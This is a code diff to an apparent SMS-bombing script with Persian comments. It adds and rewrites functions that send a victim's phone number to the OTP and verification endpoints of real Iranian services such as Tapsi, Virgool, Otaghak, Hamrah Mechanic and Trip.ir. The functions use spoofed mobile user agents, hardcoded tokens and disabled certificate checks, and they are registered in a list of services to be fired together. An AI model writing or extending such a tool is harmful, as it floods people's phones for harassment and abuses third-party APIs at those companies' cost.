@@ -66,6 +66,126 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
+
+def tapsi(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Accept": "application/json",
+            "Content-Type": "application/json"
+        }
+        
+        payload = {
+            "credential": {
+                "phoneNumber": formatted_phone,
+                "role": "PASSENGER"
+            }
+        }
+        
+        response = requests.post(
+            "https://tap33.me/api/v2/user",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[Debug] tapsi Status: {response.status_code}{a}')
+        print(f'{y}[Debug] tapsi Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(tapsi) sms sent successfully!{a}')
+            return True
+        else:
+            print(f'{r}[-] tapsi error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] tapsi exception: {e}{a}')
+        return False
+        
+
+def virgool(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Accept": "application/json",
+            "Content-Type": "application/json"
+        }
+        
+        payload = {
+            "method": "phone",
+            "identifier": formatted_phone
+        }
+        
+        response = requests.post(
+            "https://virgool.io/api/v1.4/auth/verify",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[Debug] virgool Status: {response.status_code}{a}')
+        print(f'{y}[Debug] virgool Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(virgool) sms sent successfully!{a}')
+            return True
+        else:
+            print(f'{r}[-] virgool error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] virgool exception: {e}{a}')
+        return False
+
+
+
+def otaghak(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Accept": "application/json",
+            "Content-Type": "application/json"
+        }
+        
+        payload = {
+            "userName": formatted_phone
+        }
+        
+        response = requests.post(
+            "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[Debug] otaghak Status: {response.status_code}{a}')
+        print(f'{y}[Debug] otaghak Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(otaghak) sms sent successfully!{a}')
+            return True
+        else:
+            print(f'{r}[-] otaghak error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] otaghak exception: {e}{a}')
+        return False
+
+
 def ShahreSandal(phone):
     try:
         session = requests.Session()
@@ -1616,14 +1736,45 @@ def alibaba(phone):
         return False
 
 def mek(phone):
-    meU = 'https://www.hamrah-mechanic.com/api/v1/auth/login'
-    meD = {"phoneNumber": "0"+phone.split("+98")[1]}
     try:
-        meR = post(url=meU, data=meD).json()
-        return meR.get('isSuccess')
-    except Exception as e: 
-        print(f"{r}[!] HamrahMechanic Exception: {e}")
+        # فرمت شماره
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+
+        # URL و payload
+        url = "https://www.hamrah-mechanic.com/api/v1/membership/otp"
+        payload = {
+            "PhoneNumber": formatted_phone,
+            "prevDomainUrl": None,
+            "landingPageUrl": "https://www.hamrah-mechanic.com/carprice/saipa/zamyadpickup/type-2543/",
+            "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
+            "prevUrl": "https://www.hamrah-mechanic.com/profile/",
+            "referrer": None
+        }
+
+        # هدرها
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "env": "prd",
+            "Source": "ios",
+            "X-Meta-Token": "413341",
+            "_uti": str(uuid.uuid4())
+        }
+
+        # درخواست POST
+        r = requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
+        print(r.status_code, r.text)  # debug
+        if r.status_code == 200:
+            return True
+        else:
+            return False
+
+    except Exception as e:
+        print(f'{r}[!] HamrahMechanic Exception: {e}{a}')
         return False
+
+
 
 def okorosh(phone):
     okJ = {
@@ -1738,36 +1889,42 @@ def ghasedak24(phone):
 
 
 def trip(phone):
-    import requests
-    
-    formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://gateway-v2.trip.ir/api/v1/totp/send-to-phone-and-email"
-    
-    payload = {
-        "phoneNumber": formatted_phone,
-        "token": "VHJpcDM4NjM2MjI1NjIxNzU2MjQwMDE1Mzgx"  # توکن ثابت
-    }
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/json",
-        "Origin": "https://www.trip.ir",
-        "Referer": "https://www.trip.ir/",
-    }
-    
     try:
-        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        url = "https://gateway-v2.trip.ir/api/v1/totp/send-to-phone-and-email"
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
         
-        if response.status_code == 200:
-            print(f'{g}(trip) {a}Code Sent')
+        headers = {
+            "accept": "application/json",
+            "content-type": "application/json",
+            "user-agent": random.choice(user_agents),
+        }
+        
+        payload = {
+            "phoneNumber": formatted_phone,
+            "token": "VHJpcDUzODc1NDUxNzAxNzU2Mzk3MTU3MTYy"  # توکن ثابت
+        }
+        
+        response = requests.post(
+            url, 
+            json=payload, 
+            headers=headers, 
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[Debug] trip Status: {response.status_code}{a}')
+        print(f'{y}[Debug] trip Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(trip) sms sent successfully!{a}')
             return True
         else:
-            print(f'{r}[-] (trip) HTTP Error: {response.status_code}{a}')
+            print(f'{r}[-] trip error: {response.status_code}{a}')
             return False
             
     except Exception as e:
-        print(f'{r}[!] trip Exception: {e}{a}')
+        print(f'{r}[!] trip exception: {e}{a}')
         return False
 
 
@@ -2104,11 +2261,11 @@ services = [
     ghasedak24, hajamooo, ilozi, katonikhan, katoonistore,
     komodaa, Koohshid, mahabadperfume, malltina, mek,
     missomister, mo7_ir, mobilex, mootanroo, mrbilit,
-    niktakala, Okala, okorosh, paklean_call,
+    niktakala, Okala, okorosh, otaghak, paklean_call,
     payonshoes, pindo, ragham_call, riiha, Sandalestan,
     shahrfarsh, ShahreSandal, snap, snapp_market, snappshop,
-    sibapp, tapsi_food, tetherland, theshoes, torobpay,
-    trip, trip_call, vitrin_shop
+    sibapp, tapsi, tapsi_food, tetherland, theshoes,
+    torobpay, trip, trip_call, virgool, vitrin_shop
 ]
 
 
